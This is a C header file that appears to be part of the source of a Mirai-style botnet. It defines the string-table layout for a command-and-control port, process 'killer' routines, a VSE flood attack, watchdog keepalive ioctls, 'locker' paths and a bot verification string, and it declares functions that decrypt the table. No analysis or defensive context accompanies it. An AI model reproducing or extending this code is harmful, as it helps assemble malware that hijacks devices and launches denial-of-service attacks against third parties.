#pragma once

#ifndef TABLE_H
#define TABLE_H

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;
    BOOL locked;
};

/* handler */
#define TABLE_CNC_PORT 1

/* killer data */
#define TABLE_KILLER_PROC 2
#define TABLE_KILLER_EXE 3
#define TABLE_KILLER_FD 4
#define TABLE_KILLER_MAPS 5
#define TABLE_KILLER_TCP 6

/* attack data */
#define TABLE_ATK_VSE 7

/* watchdog ioctl data */
#define TABLE_IOCTL_KEEPALIVE1 8
#define TABLE_IOCTL_KEEPALIVE2 9
#define TABLE_IOCTL_KEEPALIVE3 10
#define TABLE_IOCTL_KEEPALIVE4 11
#define TABLE_IOCTL_KEEPALIVE5 12
#define TABLE_IOCTL_KEEPALIVE6 13
#define TABLE_IOCTL_KEEPALIVE7 14

#define LOCKER_PATH_1 15
#define LOCKER_PATH_2 16
#define LOCKER_PATH_3 17
#define LOCKER_PATH_4 18
#define LOCKER_PATH_5 19
#define LOCKER_PATH_6 20
#define LOCKER_BLACKLIST_1 21
#define LOCKER_BLACKLIST_2 22

//#define MAP_BUFFER_1 23
//#define MAP_BUFFER_2 24
//#define MAP_BUFFER_3 25
//#define NUMA_BUFFER_1 26
//#define NUMA_BUFFER_2 27
#define POS_BUFFER_1 23
#define TABLE_KILLER_CMD 24
#define BOT_VERIFY_STRING 35

#define KILLER_SOCKET_1 36
#define KILLER_SOCKET_2 37
#define KILLER_SOCKET_3 38
#define KILLER_SOCKET_4 39
#define KILLER_SOCKET_5 40
#define KILLER_SOCKET_6 41
#define KILLER_SOCKET_7 42
#define KILLER_SOCKET_8 43
#define KILLER_SOCKET_9 44
#define KILLER_SOCKET_10 45
#define KILLER_SOCKET_11 46
#define KILLER_SOCKET_12 47

#define TABLE_MAX_KEYS 48

void sec_init(void);
void sec_toggle(uint8_t id);
char *sec_unwrap(int, int *);
#endif
